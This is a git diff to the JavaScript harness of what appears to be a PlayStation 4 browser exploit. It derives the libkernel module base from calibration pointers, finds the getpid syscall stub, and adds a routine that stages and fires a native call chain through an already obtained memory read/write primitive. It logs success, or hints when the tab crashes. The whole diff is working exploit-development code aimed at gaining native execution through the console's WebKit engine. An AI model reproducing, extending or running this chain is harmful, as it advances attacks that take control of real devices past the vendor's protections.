@@ -44,7 +44,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830f";
+const BUILD_ID = "rw-20250830g";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -245,6 +245,32 @@ function parseAddr(str) {
     if (!/^[0-9a-f]+$/.test(s)) return null;
     if (s.length <= 8) return new int64(parseInt(s, 16), 0);
     return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
+}
+
+/** PS4 module bases are 16KB-aligned. */
+function alignModuleBase(addr) {
+    if (!addr) return null;
+    return new int64(addr.low & ~0x3fff, addr.hi);
+}
+
+function lkBaseFromCalEntry(c) {
+    const codePtr = parseAddr(c.ptr);
+    if (!codePtr) return null;
+    let rva = 0;
+    if (c.code) {
+        const s = String(c.code).replace(/^0x/i, "");
+        if (/^[0-9a-f]+$/i.test(s)) rva = parseInt(s, 16);
+    }
+    const raw = rva ? codePtr.sub32(rva) : codePtr;
+    return alignModuleBase(raw);
+}
+
+function validateLkBase(lk) {
+    if (!lk) return "missing libkernel base";
+    if (lk.hi === 0) return "base hi=0 — need full 64-bit ptr";
+    if ((lk.low & 0x3fff) !== 0)
+        return "not 16KB-aligned — Load cal ptr (computes base) or paste module base not code ptr";
+    return null;
 }
 
 function fmtHex32(v) {
@@ -452,13 +478,7 @@ function runManualTest(testId) {
                 mark("LK-SKIP", "enter libkernel base hex, then Force lk (0 reads)");
                 return;
             }
-            saveLibkernelSession(lk, null, { forced: true });
-            mark("LK-OK", "forced " + lk + " (0 reads — unverified)");
-            state("libkernel forced", "warn");
-            tryAutoArmGetpid(lk);
-            renderOut();
-            crashLog.append("LK-OK forced " + lk, "LK-OK");
-            crashLog.flushSync();
+            runForceLkAndGetpid(lk);
             return;
         }
         if (testId === "scan-iat") {
@@ -1778,11 +1798,12 @@ function runTryCalPtrs() {
     }
     const c = cands[calPtrIdx++];
     if (lines.length > 32) lines.splice(0, lines.length - 32);
-    if (addrIn) addrIn.value = c.ptr;
+    const lkBase = lkBaseFromCalEntry(c);
+    if (addrIn && lkBase) addrIn.value = String(lkBase);
     lkQuiet = true;
     mark("LK-CAL", "build=" + BUILD_ID + " " + calPtrIdx + "/" + cands.length
-        + " " + c.label + " " + c.ptr + " expect " + c.code);
-    mark("LK-HINT", "0 reads — edit hex to lk base from cal, tap Force lk");
+        + " " + c.label + " code=" + c.ptr + " → base=" + lkBase);
+    mark("LK-HINT", "hex has module base — tap Force lk (auto-fires getpid)");
     lkQuiet = false;
     if (outEl) {
         outEl.textContent = lines.join("\n");
@@ -2113,17 +2134,68 @@ function ensureNativePrep(p, off) {
     return nativePrep;
 }
 
-function tryAutoArmGetpid(lk) {
-    if (!ready || !window.p || !nativePrep || nativeStaged || !lk) return;
+function getpidStubAddr(lk, off) {
+    const stubOff = (off.k_stubs && off.k_stubs[SYS_GETPID]) || 0x2cb70;
+    return { stub: lk.add32(stubOff), stubOff };
+}
+
+/** Force lk → arm → fire in one sync block (chain_poops timing). */
+function runForceLkAndGetpid(lk) {
+    if (busy || !ready || !window.p || !nativeAllowed) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const lkWarn = validateLkBase(lk);
+    if (lkWarn) mark("LK-WARN", lkWarn);
+
+    busy = true;
+    setUi();
+    nativeQuiet = true;
+    lkQuiet = true;
+    retained.length = 0;
+    pointers.length = 0;
+
+    let pid = -1;
+    let errMsg = null;
     try {
-        stageGetpid(window.p, nativePrep, lk, loadEffectiveOff());
-        nativeStaged = true;
-        mark("NATIVE-ARMED", "G0 set — tap Fire getpid (zero alloc)");
-        state("armed — Fire getpid", "warn");
-        setUi();
+        saveLibkernelSession(lk, null, { forced: true });
+        mark("LK-OK", "forced " + lk + " (0 reads)");
+        if (!nativePrep) ensureNativePrep(p, off);
+        const { stub, stubOff } = getpidStubAddr(lk, off);
+        stageGetpid(p, nativePrep, lk, off);
+        mark("NATIVE-ARMED", "stub=" + stub + " (lk+" + stubOff.toString(16) + ")");
+        crashLog.append("NATIVE-FIRE lk=" + lk + " stub=" + stub, "NATIVE-FIRE");
+        crashLog.flushSync();
+        pid = fireGetpid(p, nativePrep);
     } catch (err) {
-        mark("NATIVE-ARM-SKIP", err.message || String(err));
+        errMsg = err.message || String(err);
     }
+
+    nativeQuiet = false;
+    lkQuiet = false;
+    nativeStaged = false;
+    if (pid > 0) {
+        mark("NATIVE-OK", "getpid=" + pid + " build=" + BUILD_ID);
+        state("getpid OK pid=" + pid, "ok");
+        crashLog.append("NATIVE-OK getpid=" + pid, "NATIVE-OK");
+        crashLog.flushSync();
+    } else {
+        const msg = errMsg || "getpid=" + pid;
+        mark("NATIVE-FAIL", msg + " build=" + BUILD_ID);
+        if (/getpid=0/.test(msg) || pid === 0)
+            mark("LK-HINT", "wrong lk base — reload, Load cal ptr, Force lk again");
+        else
+            mark("LK-HINT", "tab died = bad stub/lk crash (not JS OOM) — try next cal vtable entry");
+        state("getpid failed", "bad");
+        crashLog.append("NATIVE-FAIL " + msg, "NATIVE-FAIL");
+        crashLog.flushSync();
+    }
+    renderOut();
+    busy = false;
+    setUi();
+}
+
+function tryAutoArmGetpid(lk) {
+    runForceLkAndGetpid(lk);
 }
 
 function runArmGetpid() {
@@ -2176,7 +2248,10 @@ function runFireGetpid() {
     let errMsg = null;
     const p = window.p;
     const lk = lkFromUi();
+    const { stub } = getpidStubAddr(lk, loadEffectiveOff());
     try {
+        crashLog.append("NATIVE-FIRE-RETRY stub=" + stub, "NATIVE-FIRE");
+        crashLog.flushSync();
         pid = fireGetpid(p, nativePrep);
     } catch (err) {
         errMsg = err.message || String(err);
